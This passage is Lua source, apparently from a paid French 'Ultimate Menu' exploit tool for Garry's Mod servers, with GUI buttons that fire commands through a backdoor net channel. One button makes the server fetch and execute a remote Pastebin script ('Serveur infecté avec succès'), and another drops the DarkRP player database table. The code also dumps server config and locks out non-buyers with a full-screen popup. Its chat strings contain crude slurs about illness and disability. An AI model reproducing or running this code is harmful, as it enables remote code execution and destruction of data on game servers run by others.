        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(multicolore)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
RunConsoleCommand( "jesuslebg" ) -- What happens when you press the button 
SploitNotify("Ouvre ta console mon clé :D")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Si tu a pas raté la manip comme un atardé mental atteint de la peste du sida & du cancer logiquement le cfg est dans ta console :D" )
surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 250 )
		Macro:SetParent(Misc)
        Macro:SetText( "Envoyer le CFG" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(multicolore)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/trJwsWcY\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Serveur infecté avec succès ! :D Clique sur 'Récup le CFG' " )
    SploitNotify("Serveur infecté avec succès !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 400 )
		Macro:SetParent(Misc)
        Macro:SetText( "Delete les datas" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(multicolore)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[ulx luarun sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")]])
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "RIP gro )" )
    SploitNotify("RIP :/ )")
    surface.PlaySound("buttons/blip1.wav") 
end





------------------------------
--     OPEN Ultimate Menu      --
------------------------------
surface.PlaySound("buttons/blip1.wav")
SploitNotify("Bienvenue sur l'Ultimate Menu " .. ply:GetName() .."Amuse toi bien avec ton jouet :D")

---------------------------------
end
concommand.Add("utlimate", Jesus)
concommand.Add("scan", checkbackdoors)
----------------------------------

else -- if steamid isn't authorized

surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 100,
    weight = 1000,
})

surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})
surface.CreateFont("Erreurmdr", {
    font = "Segoe UI Light",
    size = 40,
    weight = 600
})
surface.CreateFont("Guillaume", {
    font = "Segoe UI Light",
    size = 500,
    weight = 300
})

concommand.Add("fucked", function()
    local Popup = vgui.Create("DFrame")
        Popup:SetSize( ScrW(), ScrH() )
        Popup:SetPos( 0,0 )
        Popup:SetVisible( true )
        Popup:SetDraggable( false )
        Popup:SetTitle( "" )
        Popup:MakePopup()
        Popup:ShowCloseButton( false )
        Popup.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(0,0,0,200) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)))
        surface.DrawRect( 0, w/2-Popup:GetTall()/1.520, ScrW(), ScrH()/4 )
        surface.SetTextColor(255,255,255) 
        surface.SetTextPos(w/2.10, h/2.40)
            surface.SetFont("Guillaume")
            surface.SetTextPos(w/6.10, h/3.800)
            surface.DrawText("Aie, Coup dur pour guillaume !")
            surface.SetFont("Erreurmdr") 
            surface.SetTextPos(w/40, h/2.70)
            surface.DrawText( "Tu n'as acheté l'Ultimate Menu," )
            surface.SetTextPos(w/40, h/2.50)              
            surface.DrawText( "donc tu ne peux pas l'utiliser." )
            surface.SetTextPos(w/40, h/2.30)
            surface.DrawText("Merci de contacter Jesus Christ ou Zilnix si l'erreur persiste.")
    end 
    button = vgui.Create("DButton", Popup)
    button:SetSize(110,32.5)
    button:SetPos(Popup:GetWide()/2+Popup:GetWide()/10, Popup:GetTall()/2.050)
    button:SetText("")
    button.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(0,0,0) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(90,0,0) ) 
        surface.DrawRect( 0+3,0+3, w-6,h-6 ) 
        surface.SetTextColor(255,255,255) 
        surface.SetFont("PopupFont") 
        surface.SetTextPos(24,5.5) 
        surface.DrawText( "Continuer" ) 
    end 
    button.DoClick = function(s,w,h) 
        Popup:Close()
    end
	
end) 
RunConsoleCommand("fucked")
end
